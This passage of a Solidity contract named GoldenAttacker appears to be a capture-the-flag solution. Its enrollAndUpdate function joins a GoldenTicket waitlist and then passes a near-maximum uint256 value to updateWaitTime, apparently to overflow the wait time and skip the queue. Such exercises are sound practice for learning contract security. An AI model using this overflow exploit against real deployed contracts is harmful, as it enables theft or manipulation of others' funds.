...
contract GoldenAttacker {
    GoldenTicket public challenge;

    constructor(address _challenge) {
        challenge = GoldenTicket(_challenge);
    }

    function enrollAndUpdate() public {
        challenge.joinWaitlist();
        challenge.updateWaitTime(
            115792089237316195423570985008687907853269984665640564039457584007912129639933
        );
    }
